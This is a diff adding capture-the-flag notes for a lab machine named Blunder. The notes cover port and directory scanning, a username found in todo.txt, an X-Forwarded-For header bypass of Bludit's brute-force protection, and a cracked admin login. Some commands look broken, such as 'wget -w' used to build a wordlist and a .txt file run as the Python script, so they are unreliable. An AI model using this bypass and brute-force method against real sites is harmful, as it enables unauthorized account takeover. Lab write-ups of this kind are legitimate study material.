@@ -1,0 +1,86 @@
+Machine-Name  :  Blunder
+IP-Address    :  10.129.80.58
+
+Command-Line: sudo nmap -A nmap/access 10.129.80.58
+Result:
+    Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-06 01:28 EST
+    Nmap scan report for 10.129.80.58
+    Host is up (0.055s latency).
+    Not shown: 998 filtered ports
+    PORT   STATE  SERVICE VERSION
+    21/tcp closed ftp
+    80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
+    |_http-generator: Blunder
+    |_http-server-header: Apache/2.4.41 (Ubuntu)
+    |_http-title: Blunder | A blunder of interesting facts
+    Aggressive OS guesses: Linux 5.0 (94%), Linux 5.0 - 5.4 (94%), Linux 5.4 (92%), HP P2000 G3 NAS device (91%), Linux 4.15 - 5.6 (91%), Linux 5.3 - 5.4 (90%), Linux 2.6.32 (90%), Linux 2.6.32 - 3.1 (90%), Infomir MAG-250 set-top box (90%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (90%)
+    No exact OS matches for host (test conditions non-ideal).
+    Network Distance: 2 hops
+
+    TRACEROUTE (using port 21/tcp)
+    HOP RTT      ADDRESS
+    1   56.41 ms 10.10.14.1
+    2   54.09 ms 10.129.80.58
+
+    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 19.36 seconds
+
+
+Browser: http://10.129.80.58
+Command-Line: sudo nano /etc/hosts
+Appended-To-File: 10.129.80.58   blunder.htb
+
+Command-Line: ./dirsearch.py -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt -e php,txt -f -t 20 -i 200,301,302 -u http://blunder.htb
+Result:
+    [01:52:44] 301 -    0B  - /admin  ->  http://blunder.htb/admin/
+    [01:52:44] 200 -    2KB - /admin/
+    [01:52:44] 200 -   30B  - /install.php
+    [01:52:45] 200 -    1KB - /LICENSE
+    [01:52:47] 200 -    3KB - /about
+    [01:52:53] 200 -    7KB - /.
+    [01:52:53] 200 -    7KB - /./
+    [01:52:57] 200 -    7KB - /0
+    [01:52:59] 200 -   22B  - /robots.txt
+    [01:54:00] 200 -  118B  - /todo.txt
+    [01:57:56] 200 -    4KB - /usb
+    [01:58:57] 200 -  563B  - /.gitignore
+
+
+Browser: http://blunder.htb/install.php
+Result:
+    Bludit is already installed ;)
+
+
+Browser: http://blunder.htb/robots.txt
+Result:
+    User-agent: *
+    Allow: /
+
+
+Browser: http://10.129.80.58/todo.txt
+    Result:
+    -Update the CMS
+    -Turn off FTP - DONE
+    -Remove old users - DONE
+    -Inform fergus that the new blog needs images - PENDING
+
+
+Possible username: fergus
+
+Notes: Found Bludit login @ http://10.129.80.58/admin/ and http://10.129.80.58/admin/login
+
+Browser-Search: Bludit exploit Rastating.
+URL: https://rastating.github.io/bludit-brute-force-mitigation-bypass/
+
+Notes: Need to add "X-FORWARDED-FOR: 127.0.0.1" to header. Placing the X-FORWARDED-FOR header to bypass brute force protection.
+
+Command-Line: wget -w blunder-wordlist.txt http://blunder.htb
+Result: /blunder-wordlist.txt
+
+Notes: Created a python3 (bludit_admin.py) script to crack the admin password using the blunder-wordlist.txt file and the admin username(fergus).
+Command-Line: python3 bludit_admin.txt
+Result:
+    CSRF Error...fergus:RolandDeschain
+
+Notes: Used username(fergus) and password(RolandDeschain) to login to 10.129.80.58/admin/login
+    *** SUCCESSFUL LOGIN ***
